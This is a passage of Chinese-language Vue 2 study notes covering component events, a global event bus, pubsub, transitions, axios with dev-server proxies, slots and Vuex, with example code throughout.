      //全选or取消全选，done即为子组件传来的true或者false了
      checkAllTodo(done){
        this.todos.forEach((todo)=>{
          todo.done = done
        })
      },
      //清除所有已经完成的，已勾选的todo
      clearAllTodo(){
        this.todos = this.todos.filter((todo)=>{
          return !todo.done
        })
      }
    }
  }
</script>

<style>
  /*base*/
  body {background: #fff;}
  .btn {display: inline-block;padding: 4px 12px;margin-bottom: 0;font-size: 14px;
    line-height: 20px;text-align: center;vertical-align: middle;cursor: pointer;
    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
    border-radius: 4px;}
  .btn-danger {color: #fff;background-color: #da4f49;border: 1px solid #bd362f;}
  .btn-danger:hover {color: #fff;background-color: #bd362f;}
  .btn:focus {outline: none;}
  .todo-container {width: 600px;margin: 0 auto;}
  .todo-container .todo-wrap {padding: 10px;border: 1px solid #ddd;border-radius: 5px;}
</style>
```

### 清空已勾选的

看上文代码即可，清空已经勾选的也是用过滤函数，过滤掉勾选的，留下return的是没被勾选的。



###  实现本地存储lcoalStorage

**存储：**

对存储对象的数组开启监视，检测到数组数据变化，就把变化的数据存到`localstorage`；还要开启深度监视，当你勾选已经完成时候，修改的是数组里的对象的属性，开深度监视才能检测到。

**读取：**

读取就相当于data里有写死的数据，在data的return里写读取的localstorage的代码即可。要注意的是当存储的内容为空时，要返回一个空数组给他，不能什么都没。

todos:JSON.parse(localStorage.getItem('todos')) || []

```vue
<template>
	<div id="root">
		<div class="todo-container">
			<div class="todo-wrap">
				<MyHeader @addTodo="addTodo"/>
				<MyList :todos="todos" :checkTodo="checkTodo" :deleteTodo="deleteTodo"/>
				<MyFooter :todos="todos" 
                  @checkAllTodo="checkAllTodo" @clearAllTodo="clearAllTodo"/>
			</div>
		</div>
	</div>
</template>

<script>
	import MyHeader from './components/MyHeader'
	import MyList from './components/MyList'
	import MyFooter from './components/MyFooter.vue'

	export default {
		name:'App',
		components:{MyHeader,MyList,MyFooter},
		data() {
			return {
				//由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）
				todos:JSON.parse(localStorage.getItem('todos')) || []
			}
		},
		methods: {
			//添加一个todo
			addTodo(todoObj){
				this.todos.unshift(todoObj)
			},
			//勾选or取消勾选一个todo
			checkTodo(id){
				this.todos.forEach((todo)=>{
					if(todo.id === id) todo.done = !todo.done
				})
			},
			//删除一个todo
			deleteTodo(id){
				this.todos = this.todos.filter( todo => todo.id !== id )
			},
			//全选or取消全选
			checkAllTodo(done){
				this.todos.forEach((todo)=>{
					todo.done = done
				})
			},
			//清除所有已经完成的todo
			clearAllTodo(){
				this.todos = this.todos.filter((todo)=>{
					return !todo.done
				})
			}
		},
		watch: {
			todos:{
				deep:true,
				handler(value){
					localStorage.setItem('todos',JSON.stringify(value))
				}
			}
		},
	}
</script>
```



# 六、任意组件通信

## 6.1 自定义组件事件

### 1. 绑定事件在子组件1：v-on

> **自定义事件作用**：实现`子传父参数`的功能。
>
> **怎么绑定和触发**：事件是绑定在子组件的vc身上，子组件vc用`$emit`触发绑定事件

- **内置事件**是：keyup、click、keydown……，这些事件是给HTML元素的（h标签、div等）；
- **vue组件的自定义事件**：是绑定在组件身上的。

> 例：

父组件给子组件**绑定了**自定义事件`v-on:cola='fatherMethod'`，fatherMethod的方法就是父组件的方法。

**自定义事件**绑定在哪里，就在哪里触发：需要子组件**触发事件**（比如子组件写一个点击test方法来完成触发），触发了才能把参数传给父；

 子的test（）{}方法里写这句来传递参数：  `this.$emit('cola',this.name,666,888,900)`，父组件的fatherMethod方法就可以收到子传递来的参数





### 2. 绑定事件在子组件2：ref+$on

> 与上文的区别是：不是写在组件的标签上，而是写在mounted方法里

子组件写ref，随之父组件拿到子组件的vc，用这个vc使用$on绑定自定义事件，还有父组件方法。

```js
   mounted() {
       
      //这条语句等同于：v-on:cola='getStudentName'，但是他没写在组件的标签上！
      this.$refs.student.$on('atguigu',this.getStudentName) // 绑定自定义事件

      // this.$refs.student.$once('atguigu',this.getStudentName) // 绑定自定义事件（一次性）

    },        
```

> 需要注意的是：若函数直接写在`this.$refs.student.$on('atguigu',function(){})`里，那么function里面的this归于子组件的vc了。可以用箭头函数解决，或者不要写在里面。







### 3. 子组件用$off()解绑事件

子组件给个按钮绑定个点击事件，事件触发的方法里写下面的代码即可，实现了：点击按钮解绑自定义事件

```js
 // 🔴解绑
       this.$off('atguigu') //解绑一个自定义事件

    // this.$off(['atguigu','demo']) //解绑多个自定义事件，写在数组里

    // this.$off() //解绑所有的自定义事件
```

### 4. 销毁vm、vc后影响自定义事件

销毁vm，vm和所有vc都会被销毁，所有自定义事件全部失效

销毁vc，对于该vc的所有自定义事件失效。



### 5. 代码演示

#### 父App.vue

```vue
<template>
  <div class="app">
    <h1>{{ msg }}，学生姓名是:{{ studentName }}</h1>
		
    <!-- 通过父组件给子组件传递函数类型的props实现子给父传递数据 -->
    <School :getSchoolName="getSchoolName"/>

    <!-- 通过父组件给子组件绑定一个自定义事件实现子给父传递数据（第一种写法，使用@或v-on） -->
    <!-- <Student @atguigu="getStudentName" @demo="m1"/> -->

    <!-- 通过父组件给子组件绑定一个自定义事件实现子给父传递数据（第二种写法，使用ref） -->
    <Student ref="student" @click.native="show"/> <!-- 🔴native -->
  </div>
</template>

<script>
  import Student from './components/Student'
  import School from './components/School'

  export default {
    name:'App',
    components:{School,Student},
    data() {
      return {
        msg:'你好啊！',
        studentName:''
      }
    },
    methods: {
      getSchoolName(name){
        console.log('App收到了学校名：',name)
      },
      getStudentName(name,...params){
        console.log('App收到了学生名：',name,params)
        this.studentName = name
      },
      m1(){
        console.log('demo事件被触发了！')
      },
      show(){
        alert(123)
      }
    },
    mounted() {
      this.$refs.student.$on('atguigu',this.getStudentName) // 🔴绑定自定义事件
      // this.$refs.student.$once('atguigu',this.getStudentName) // 绑定自定义事件（一次性）
    },
  }
</script>

<style scoped>.app{background-color: gray;padding: 5px;}</style>
```

#### Student.vue

```vue
<template>
	<div class="student">
		<h2>学生姓名：{{name}}</h2>
		<h2>学生性别：{{sex}}</h2>
		<h2>当前求和为：{{number}}</h2>
		<button @click="add">点我number++</button>
		<button @click="sendStudentlName">把学生名给App</button>
		<button @click="unbind">解绑atguigu事件</button>
		<button @click="death">销毁当前Student组件的实例(vc)</button>
	</div>
</template>

<script>
	export default {
		name:'Student',
		data() {
			return {
				name:'张三',
				sex:'男',
				number:0
			}
		},
		methods: {
			add(){
				console.log('add回调被调用了')
				this.number++
			},
			sendStudentlName(){
				// 触发Student组件实例身上的atguigu事件
				this.$emit('atguigu',this.name,666,888,900)
				// this.$emit('demo')
				// this.$emit('click')
			},
			unbind(){
        // 🔴解绑
				this.$off('atguigu') //解绑一个自定义事件
				// this.$off(['atguigu','demo']) //解绑多个自定义事件
				// this.$off() //解绑所有的自定义事件
			},
			death(){
        // 销毁了当前Student组件的实例，销毁后所有Student实例的自定义事件全都不奏效
				this.$destroy()
			}
		},
	}
</script>

<style lang="less" scoped>
	.student{background-color: pink;padding: 5px;margin-top: 30px;}
</style>
```



### 6. 内置事件.native

普通HTML元素添加内置事件，可以正常实现。

但是在组件标签添加原生的事件，他会认为是你自定义的，无法实现，因此要添加**修饰符native**

例：

```html
添加native，vue就知道这个事件不是你自定义的，而是内置的。

<Student ref="student" @click.native="show"/> 
```



## 6.2 全局事件总线

### 谁当中转站？

拿一个人来做中转站，这个中转站必须让所有组件都能看得到，根据Vue的内置关系**第五章5.1**，可以知道，爷爷的数据，子孙们才可拿到，那么这个爷爷啊，就是Vue的**原型对象Vue.prototype**了。在Vue.prototype上放一个vc就行了！如下图：

### 定义中转站与使用

> 实现了任意组件之间通信！

父亲要用$on绑定自定义事件传数据，但是$on这api只有vm和vc身上才有，那么就生成一个呗，**x在Vue就是$bus**

![image-20220609192145674](https://i0.hdslb.com/bfs/album/1b119af587f0db80f3e3e12d71c694848de615b3.png)

但是没必要新生成一个，vm身上有$on，把这个vm放在**原型对象Vue.prototype**里，这样就可以了！巧妙用生命周期的this所指，

把这个`Vue.prototype.$bus = vm` ，然后，**$bus就是总线了。**

![image-20220609192628262](https://i0.hdslb.com/bfs/album/d12525d54648bde90abcb38d5de0ae42ad1d6741.png)

**在mounted时期就绑定自定义事件：**在任意组件中都可以拿到$bus（因为他在Vue.prototype上），绑定自定义事件，**接收数据**

![image-20220609194021088](https://i0.hdslb.com/bfs/album/54c559ac9b25366afa73f44a9463b3faac62bc8b.png)

然后拿另一个任意组件，触发自定义事件的，**发送数据this.name**

![image-20220609194344314](https://i0.hdslb.com/bfs/album/48bd58d0e133463528999dda73981cc2476f3359.png)



**在beforeDestroy解绑自定义事件：**销毁拿谁销毁？**拿中转站来销毁自定义事件**

在App.vue的beforeDestroy钩子函数中写好注销自定义事件：

```js
beforeDestroy() {     // 绑在$bus上的 都要主动销毁，因为App.vue销毁之后，$bus还在，在上面注册的事件都还在占空间，所以销毁时得一起$off掉
        this.$bus.$off(['事件1','事件2'])	// 同时关闭多个用数组形式放进去
  }

```







## 6.3 消息订阅与发布

### 下载库

> npm i pubsub-js
>
> 库下载好了，就在要使用的组件import导入！import pubsub from 'pubsub'

- 发送数据的组件发布消息，
- 接收数据的组件订阅消息，不过接收者括号里写两个参数，第一个是方法名字，第二个才是数据！
- 最后在beforeDestroy**通过订阅id取消订阅**。

**学校组件接收：**

```vue
<template>
	<div class="school">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
	</div>
</template>

<script>
	import pubsub from 'pubsub-js'

	export default {
		name: 'School',
		data() {
			return {
				name:'尚硅谷',
				address:'北京',
			}
		},
		methods: {
            //第一个方法名，第二个参数
			demo(msgName, data) {
				console.log('我是School组件，收到了数据：',msgName, data)
			}
		},
		mounted() {
			this.pubId = pubsub.subscribe('demo', this.demo) // 订阅消息
		},
		beforeDestroy() {
			pubsub.unsubscribe(this.pubId) // 取消订阅
		}
	}
</script>

<style scoped>
	.school{
		background-color: skyblue;
		padding: 5px;
	}
</style>
```

**学生组件发布消息：**

```vue
<template>
  <div class="student">
    <h2>学生姓名：{{name}}</h2>
    <h2>学生性别：{{sex}}</h2>
    <button @click="sendStudentName">把学生名给School组件</button>
  </div>
</template>

<script>
  import pubsub from 'pubsub-js'

  export default {
    name:'Student',
    data() {
      return {
        name:'JOJO',
        sex:'男',
      }
    },
    methods: {
      sendStudentName(){
        pubsub.publish('demo', this.name) // 发布消息
      }
    }
  }
</script>

<style scoped>
  .student{
    background-color: pink;
    padding: 5px;
    margin-top: 30px;
  }
</style>
```



# 七、过渡与动画问题

## 7.1 $nextTick

### 光标对焦输入框

> 让输入框先渲染出来，再自动获取焦点

用户点击编辑时，让用户的光标自动对焦到输入框，怎么实现？

在点击事件的函数里实现，但是点击事件是先响应完，再渲染页面的，就是你的focus对焦完了，页面才出现，这样实现不了。

怎么解决？

用 `this.$nextTick（（）{DOM.focus()}）`函数，这样一来，**就是在下一次DOM更新结束后，执行nextTick里面的函数！**

就是点击编辑按钮会出现输入框，再输入框出现后，再执行这个函数！



## 7.2 过渡与动画

### 图示

> 过渡与动画的实现：可以用下面两种方式：
>
> 进入的起点==离开的终点
>
> 进入的终点==离开的起点



![image-20220610100307856](https://i0.hdslb.com/bfs/album/b5934d4964be625c3c725f3d68d58c6ec4d97017.png)



### Vue动画初步演示

**Test.vue**[动画演示组件]

```vue
<template>
  <div>
      <button @click="isShow=!isShow">显示/隐藏</button>
      <!-- 要实现动画的标签用Vue的transition包裹起来，命名name：hello
      添加appear属性就是浏览器一打开初始化就加载动画！！！:appear="true"可以简写为appear -->
      <transition name="hello" :appear="true">
        <h2 v-show="isShow">动画测试</h2>
      </transition>
  </div>
</template>

<script>
export default {
    name:'Test',
    data() {
        return {
            isShow:true
        }
    },

}
</script>

<style scoped>
    h2{
        background: rgb(185, 86, 86);
    }
    /* 这里就是规定的命名:进入动画和离开动画的激活，规定写死！ 
    倘若你的transition没有name，那么这里的hello-enter-active为v-enter-active
    */
    .hello-enter-active{
        animation: donghua 0.5s linear;
    }
    .hello-leave-active{
        animation: donghua 0.5s linear reverse;
    }
    @keyframes donghua{
        from{
            transform: translateX(-100%);
        }
        to{
            transform: translateX(0px);
        }
    }
</style>
```

### transition-group多元素动画

备注：若有多个元素需要过度，则**必须使用**`<transition-group>`，且每个元素都要指定key值（随便指定1、2），相当于v-for遍历的key值！

```vue
<transition-group name="hello" appear>
  <h1 v-show="!isShow" key="1">你好啊！</h1>
  <h1 v-show="isShow" key="2">尚硅谷！</h1>
</transition-group>
```

### Animate.css引入第三方动画库

官网：[Animate.css | A cross-browser library of CSS animations.](https://animate.style/)；

下载库：npm install animate.css --save

引入：yarn add animate.css

在要使用的元素添加固定前缀：`animate__animated animate__bounce`

> 如下代码所示：
>
> 进入动画选择第三库的：animate__swing
>
> 离开动画选择第三库的：animate__backOutUp

```vue
<transition-group appear
          name="animate__animated animate__bounce"
          enter-active-class="animate__swing"
          leave-active-class="animate__backOutUp">
  <h1 v-show="!isShow" key="1">你好啊！</h1>
  <h1 v-show="isShow" key="2">尚硅谷！</h1>
</transition-group>
```



# 八、axios请求数据

## 8.1 引入axios

### axios请求与跨域

下载：npm i axios

导入：import axios from 'axios'

**代码：**

>axios.get返回值then写两个回调函数：成功与失败的！
>
>为什么是localhost:8080？因为跨域问题用了**Vue-cli的代理配置**，看下文！

```vue
<template>
	<div>
		<button @click="getStudents">获取学生信息</button>
		<button @click="getCars">获取汽车信息</button>
	</div>
</template>

<script>
	import axios from 'axios'
	export default {
		name:'App',
		methods: {
			getStudents() {
				axios.get('http://localhost:8080/students').then(
					response => {
						console.log('请求成功了',response.data)
					},
					error => {
						console.log('请求失败了',error.message)
					}
				)
			},
			getCars() {
				axios.get('http://localhost:8080/demo/cars').then(
					response => {
						console.log('请求成功了',response.data)
					},
					error => {
						console.log('请求失败了',error.message)
					}
				)
			}
		},
	}
</script>
```

### Vue-cli的代理配置

作用：解决跨域问题。

优点：配置简单，请求资源时直接发给前端（8080）即可
缺点：**不能配置多个代理**，不能控制请求是否走代理。

> 缺点例如：当请求`localhost:8080/students`时候，恰好public里有students，那他绝对不走代理，他会主动拿你原来在public。(因为这是内置带有的请求，就算没有代理，网址输入`localhost:8080/students`也能拿到）      那怎么行？我要的是服务器的students。

![image-20220610105435652](https://i0.hdslb.com/bfs/album/b24e1942ed0218e49528292a4dbf89e2331bae43.png)

> 在vue.config.js中添加如下配置，代理的服务器是哪一个端口，就写哪个端口。**更改了Vue的配置文件要重启Vue服务**

配置了这个代理后，axios请求时，就不用写5000，直接写8080，因为浏览器问8080代理服务器拿数据。

```js
module.exports = {
  devServer:{
    proxy:"http://localhost:5000"
  }
}
```

原理如图所示：

![image-20220610110123777](https://i0.hdslb.com/bfs/album/26e49b75d72e5795968f067588b0473b4c458dc1.png)



### Vue-cli多个代理配置

作用：这个代理配置，可以完美解决上文的单个代理配置的所有缺点。完美解决跨域问题。

同样是配置**vue.config.js**

```js
module.exports = {
	devServer: {
      proxy: {
      '/api1': {							// 匹配所有以 '/api1'开头的请求路径
        target: 'http://localhost:5000',	// 代理目标的基础路径
        pathRewrite: {'^/api1':''},			// 再把代理往后端服务器的请求前缀/api1设为空，这样就不会请求到public下的资源了！解决了缺点①
        ws: true,							// WebSocket
        changeOrigin: true,    				//是否让代理服务器端口号跟服务器端口号一样？
        
      },
        //配置多个代理，解决了缺点②
      '/api2': {
        target: 'http://localhost:5001',
        pathRewrite: {'^/api2': ''},
        changeOrigin: true
      }
    }
  }
}
/*
   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
   changeOrigin默认值为true
*/
```



## 8.2 github实例实战

### 静态资源引入

> 公共部分的css样式，一般是程序员写的，才放在App.vue。如果是cv复制引入的css样式，那么可以放在

- assets下创建css文件夹：但是要在App.vue使用Import导入，使用Import有严格检查，**如果资源不存在会报错**
- public下创建css文件夹：然后可以在index.html下，想三剑客那样引入，**资源不存在不会报错。**

### 实现网页功能

> 实现网页一开始显示欢迎词，用户一搜索显示加载中，获取到后台数据就显示数据。

index.html

```html
<!DOCTYPE html>
<html lang="">
    <head>
        <meta charset="UTF-8">
        <!-- 针对IE浏览器的特殊配置，含义是让IE浏览器以最高渲染级别渲染页面 -->
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <!-- 开启移动端的理想端口 -->
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <!-- 配置页签图标 -->
        <link rel="icon" href="<%= BASE_URL %>favicon.ico">
      
        <!-- 引入bootstrap样式 -->
        <link rel="stylesheet" href="<%= BASE_URL %>css/bootstrap.css">
      
        <!-- 配置网页标题 -->
        <title><%= htmlWebpackPlugin.options.title %></title>
    </head>
    <body>
        <!-- 容器 -->
        <div id="app"></div>
    </body>
</html>
```

搜索框组件：请求数据

```vue
<template>
  <section class="jumbotron">
    <h3 class="jumbotron-heading">Search Github Users</h3>
    <div>
      <input type="text" placeholder="enter the name you search" v-model="keyWord"/>&nbsp;
      <button @click="searchUsers">Search</button>
    </div>
  </section>
</template>

<script>
import axios from "axios";
export default {
  name: "Search",
  data() {
    return {
      keyWord: "",
    };
  },
  methods: {
    searchUsers() {
      //请求前更新List的数据,请求前显示加载中···，关闭欢迎词。
      this.$bus.$emit("updateListData", {
        isLoading: true,
        errMsg: "",
        users: [],
        isFirst: false,
      });
        //this.keyWord这里获取用户输入的是要搜索什么名字的用户！模糊搜索
      axios.get(`https://api.github.com/search/users?q=${this.keyWord}`).then(
        (response) => {
          console.log("请求成功了");
          this.$bus.$emit("updateListData", {	//请求成功后更新List的数据
            isLoading: false,
            errMsg: "",
            users: response.data.items,
          });
        },
        (error) => {
          this.$bus.$emit("updateListData", {	//请求后更新List的数据
            isLoading: false,
            errMsg: error.message,
            users: [],
          });
        }
      );
    },
  },
};
</script>
```

展示组件：兄弟组件拿到数据渲染

```vue
<template>
  <div class="row">
    <!-- 展示用户列表 -->
    <div v-show="info.users.length" class="card" 
         v-for="user in info.users" :key="user.login">
      <a :href="user.html_url" target="_blank">
        <img :src="user.avatar_url" style="width: 100px" />
      </a>
      <p class="card-text">{{ user.login }}</p>
    </div>
    <!-- 展示欢迎词 -->
    <h1 v-show="info.isFirst">欢迎使用！</h1>
    <!-- 展示加载中 -->
    <h1 v-show="info.isLoading">加载中....</h1>
    <!-- 展示错误信息 -->
    <h1 v-show="info.errMsg">{{ info.errMsg }}</h1>
  </div>
</template>

<script>
export default {
  name: "List",
  data() {
    return {
      info: {
        isFirst: true,
        isLoading: false,
        errMsg: "",
        users: [],
      },
    };
  },
  mounted() {
    this.$bus.$on("updateListData", (dataObj) => {
      this.info = dataObj
      //this.info = { ...this.info, ...dataObj };
    });
  },
};
</script>

<style scoped>
.album {min-height: 50rem; /* Can be removed; just added for demo purposes */
  padding-top: 3rem;padding-bottom: 3rem;background-color: #f7f7f7;}
.card {float: left;width: 33.333%;padding: 0.75rem;margin-bottom: 2rem;
  border: 1px solid #efefef;text-align: center;}
.card > img {margin-bottom: 0.75rem;border-radius: 100px;}
.card-text {font-size: 85%;}
</style>
```



## 8.3 插件库v-resource

这是Vue1.0版本的，了解即可。

安装：npm i vue-resource



```js
import Vue from 'vue'
import App from './App.vue'
//导入
import vueResource from 'vue-resource'

Vue.config.productionTip = false
//使用插件
Vue.use(vueResource)

new Vue({
    el:"#app",
    render: h => h(App),
    beforeCreate(){
        Vue.prototype.$bus = this
    }
})
```

使用时候：

 axios.get改为this.$http.get()，就是说$http在vc身上有！



# 九、slot插槽

### 插槽slot与插槽名字

父组件给子组件的插槽填充内容时，子组件要定义插槽，有了插槽后，父组件就知道放在哪里了

> 指定插槽的两种：

- slot='myslot'
- v-slot:myslot		#这个必须使用在template标签！新特点的坑



需求：

![image-20220610201140257](https://i0.hdslb.com/bfs/album/1e62c581b173a82392b4523059fe495f00475301.png)

代码：

**App.vue使用插槽**

```vue
<template>
	<div class="container">
		<Category title="美食" >
			<img slot="conter" src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg" alt="">
			<a slot="footer" href="http://www.atguigu.com">更多美食</a>
		</Category>

		<Category title="游戏" >
			<ul slot="center">
				<li v-for="(g,index) in games" :key="index">{{g}}</li>
			</ul>
			<div class="foot" slot="footer">
				<a href="http://www.atguigu.com">单机游戏</a>
				<a href="http://www.atguigu.com">网络游戏</a>
			</div>
		</Category>

		<Category title="电影">
			<video slot="center" controls src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"></video>
			<template v-slot:footer>
				<div class="foot">
					<a href="http://www.atguigu.com">经典</a>
					<a href="http://www.atguigu.com">热门</a>
					<a href="http://www.atguigu.com">推荐</a>
				</div>
				<h4>欢迎前来观影</h4>
			</template>
		</Category>
	</div>
</template>

<script>
	import Category from './components/Category'
	export default {
		name:'App',
		components:{Category},
		data() {
			return {
				foods:['火锅','烧烤','小龙虾','牛排'],
				games:['红色警戒','穿越火线','劲舞团','超级玛丽'],
				films:['《教父》','《拆弹专家》','《你好，李焕英》','《尚硅谷》']
			}
		},
	}
</script>

<style scoped>
	.container,.foot{display: flex;justify-content: space-around;}
	h4{text-align: center;}
</style>
```

**子组件定义插槽**

```vue
<template>
	<div class="category">
		<h3>{{title}}分类</h3>
		<!-- 定义一个插槽（挖个坑，等着组件的使用者进行填充） -->
		<slot name="center">我是一些默认值，当使用者没有传递具体结构时，我会出现1</slot>
		<slot name="footer">我是一些默认值，当使用者没有传递具体结构时，我会出现2</slot>
	</div>
</template>

<script>
	export default {
		name:'Category',
		props:['title']
	}
</script>

<style scoped>
	.category{background-color: skyblue;width: 200px;height: 300px;}
	h3{text-align: center;background-color: orange;}
	video{width: 100%;}
	img{width: 100%;}
</style>
```

### 作用域插槽

目的：父组件没数据，他拿子组件的数据，来填充子组件插槽。

那么**作用域插槽**才可做到，子组件的数据传给父组件

> 父组件**绑定插槽名**同时**获取到子组件的数据**，如何同时写？最新命令如下：
>
>  `v-slot:插槽名="{传递数据名}"`   这样数据是直接拿，或者
>
> `v-slot:插槽名="atguigu"`    这样数据是atguigu.games

![image-20220610204320366](https://i0.hdslb.com/bfs/album/e1fa6258db266562b5322049540bdcdb240ff0ec.png)

子组件

```vue
<template>
	<div class="category">
		<h3>{{title}}分类</h3>
         <!-- 定义作用域插槽，名字为games -->
		<slot :games="games" msg="hello">我是默认的一些内容</slot>
	</div>
</template>

<script>
	export default {
		name:'Category',
		props:['title'],
		data() {
			return {
				games:['红色警戒','穿越火线','劲舞团','超级玛丽'],
			}
		},
	}
</script>

<style scoped>
	.category{background-color: skyblue;width: 200px;height: 300px;}
	h3{text-align: center;background-color: orange;}
	video{width: 100%;}
  img{width: 100%;}
</style>
```

父组件

```VUE
<template>
	<div class="container">

		<Category title="游戏">
			<template scope="atguigu">
				<ul>
					<li v-for="(g,index) in atguigu.games" :key="index">{{g}}</li>
				</ul>
			</template>
		</Category>

		<Category title="游戏">
			<template scope="{games}">
				<ol>
					<li style="color:red" v-for="(g,index) in games" :key="index">{{g}}</li>
				</ol>
			</template>
		</Category>

		<Category title="游戏">
			<template slot-scope="{games}">
				<h4 v-for="(g,index) in games" :key="index">{{g}}</h4>
			</template>
		</Category>
	</div>
</template>

<script>
	import Category from './components/Category'
	export default {
		name:'App',
		components:{ Category },
	}
</script>

<style scoped>
	.container,.foot{display: flex;justify-content: space-around;}
	h4{text-align: center;}
</style>
```



# 十、Vuex

## 10.1 初识Vuex

### 看图了解

> vuex归store管理，里面的api都是store的；
>
> 注意数据已经不是放在组件里了，而是放在store的state中，组件数据需要频繁在各种组件之间交互的，就可以把数据放在store的state中

![image-20220611010816077](https://i0.hdslb.com/bfs/album/bde2af8381a0512512696e56aa6144c769aedd4f.png)

### 安装Vuex、初始环境

Vue2只能用VueX 3，Vue3只能用VueX 4，npm i vuex 默认是4

>- 安装VueX 3：npm i vuex@3
>- 导入：import Vuex from 'vuex'
>- 是插件，使用：Vue.use(Vuex)



> 解决出现的顺序问题：要先`Vue.use（Vuex）`，再`import store from xxx`

Vue的所有import 导包语句，无论import写在多后面，Vue扫描的时候都是首先扫描import的，随后再扫描其他的。怎么解决上面问题？在src/store/index.js使用`Vue.use（Vuex）`

> 这两个步骤完成之后，因为vm身上加了个store，因此所有组件身上都有store了！

创建src/store/index.js该文件用于创建Vuex中最为核心的store

```js
import Vue from 'vue'
import Vuex from 'vuex'	// 引入Vuex

Vue.use(Vuex)	// 应用Vuex插件

const actions = {}		// 准备actions——用于响应组件中的动作
const mutations = {}	// 准备mutations——用于操作数据（state）
const state = {}			// 准备state——用于存储数据

// 创建并暴露store
export default new Vuex.Store({
	actions,
	mutations,
	state,
})
```

在src/main.js中创建vm时传入store配置项

```js
import Vue from 'vue'
import App from './App.vue'
import store from './store'	// 引入store

Vue.config.productionTip = false

new Vue({
	el: '#app',
	render: h => h(App),
	store,										// 配置项添加store
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})
```



## 10.2 Store数据实战

### store的第一个实战

普通子组件Count.Vue

```vue
<template>
	<div>
        <!-- 组件在store.state下拿到数据 -->
		<h1>当前求和为：{{ $store.state.sum }}</h1>
		<select v-model.number="n">
			<option value="1">1</option>
			<option value="2">2</option>
			<option value="3">3</option>
		</select>
		<button @click="increment">+</button>
		<button @click="decrement">-</button>
		<button @click="incrementOdd">当前求和为奇数再加</button>
		<button @click="incrementWait">等一等再加</button>
	</div>
</template>

<script>
	export default {
		name:'Count',
		data() {
			return {
				n:1, //用户选择的数字
			}
		},
		methods: {
			increment(){
                //不要Actions，直接commit给Mutations
				this.$store.commit('JIA',this.n)
			},
			decrement(){
                //不要Actions，直接commit给Mutations
				this.$store.commit('JIAN',this.n)
			},
			incrementOdd(){
                //判断是否为奇数写在Actions里面，这个要Actions，使用dispatch
				this.$store.dispatch('jiaOdd',this.n)
			},
			incrementWait(){
				this.$store.dispatch('jiaWait',this.n)
			},
		}
	}
</script>

<style lang="css">button{margin-left: 5px;}</style>
```

**store的index.js**

> 上下文context： 相当于精简版的 $store，该有的数据跟store一样都能拿到。
>
> value：就是组件传给store的值

```js
import Vue from 'vue'
import Vuex from 'vuex'	// 引入Vuex

Vue.use(Vuex)	// 应用Vuex插件

// 准备actions——用于响应组件中的动作
const actions = {
   // 不需要Actions
	/* jia(context,value){
		console.log('actions中的jia被调用了')
		context.commit('JIA',value)
	},
	jian(context,value){
		console.log('actions中的jian被调用了')
		context.commit('JIAN',value)
	}, */
	jiaOdd(context,value){	// context 相当于精简版的 $store
		console.log('actions中的jiaOdd被调用了')
        //上下文拿到组件目前的sum，判断是否为奇数
		if(context.state.sum % 2){
			context.commit('JIA',value)
		}
	},
	jiaWait(context,value){
		console.log('actions中的jiaWait被调用了')
		setTimeout(()=>{
			context.commit('JIA',value)
		},500)
	}
}
// 准备mutations——用于操作数据（state）
const mutations = {
    //标准写法，方法在mutations，变成大写。
	JIA(state,value){
		console.log('mutations中的JIA被调用了')
		state.sum += value
	},
	JIAN(state,value){
		console.log('mutations中的JIAN被调用了')
		state.sum -= value
	}
}
// 准备state——用于存储数据
const state = {
    //共享的数据放在这，是组件来这里拿！！
	sum:0 //当前的和
}

// 创建并暴露store
export default new Vuex.Store({
	actions,
	mutations,
	state,
})
```



### devtools使用与问题延伸

devtools也在Vue的扩展里



> 问题延伸：上文的实战可省Actions，那么为什么还需要他？

当一方法调用的逻辑判断过于复杂的时候，那就写在Actions里封装了，过于复杂的逻辑判断写在Vue组件那肯定是不好的。





### getters配置项

> 相当于计算属性computed，对数据进行加工，并返回一个加工值

store下的index.js

```js

......
//getters拿到数据state.sum，并对数据进行加工，最后return
const getters = {
	bigSum(state){
		return state.sum * 10
	}
}

// 创建并暴露store
export default new Vuex.Store({
	......
	getters
})
```

组件拿到数据bigSum，简直如计算属性

```vue
<!-- 拿到state里面的值-->
<h1>当前求和为：{{ $store.state.sum }}</h1>
<!-- 拿到getter加工的值 -->
<h3>当前求和的10倍为：{{ $store.getters.bigSum }}</h3>
```



### mapState和mapGetters

谁使用store谁就导入：`import {mapState, mapGetters, mapMutations, mapActions} from 'vuex'`

> mapState方法：用于帮助映射state中的数据为计算属性
>
> mapGetters方法：用于帮助映射getters中的数据为计算属性  



①一开始这样拿数据，$store.state.sum太长了

```vue
<!-- 拿到state里面的值-->
<h1>当前求和为：{{ $store.state.sum }}</h1>
<!-- 拿到getter加工的值 -->
<h3>当前求和的10倍为：{{ $store.getters.bigSum }}</h3>
```

②优化，把$store.state.sum写在计算属性中，然后拿数据就直接写计算属性{{sum}}和{{bigSum}}

```js
computed: {
    sum(){
        return $store.state.sum 
    }
    bigSum(){
        return $store.getters.bigSum
    }
},
```

**③再优化，使用mapState和mapGetters**

```js
computed: {
  	// 借助mapState生成计算属性：sum、school、subject（对象写法一）
    //ES6写法，sum和计算属性名，'sum'是state里面的值。
  	...mapState({sum:'sum',school:'school',subject:'subject'}),

  	// 借助mapState生成计算属性：sum、school、subject（数组写法二）,同名了，用数组写法
  	...mapState(['sum','school','subject']),
        
        //mapGetters：
        
    //借助mapGetters生成计算属性：bigSum（对象写法一）
    ...mapGetters({bigSum:'bigSum'}),

    //借助mapGetters生成计算属性：bigSum（数组写法二）
    ...mapGetters(['bigSum'])
},
    

```

### mapActions和mapMutations

与上文的**mapState和mapGetters**同理：谁用谁导入`import {mapState, mapGetters, mapMutations, mapActions} from 'vuex'`

> 作用：
>
> mapActions：简写了你和Vuex的`dispatch[给服务员mapActions]`的过程
>
> mapMutations：简写`commit[给后厨mapMutations]`的过程！

![image-20220611132309060](https://i0.hdslb.com/bfs/album/0f007f5e6f3d002dfd8a5de5d6163b67022f5774.png)

```js
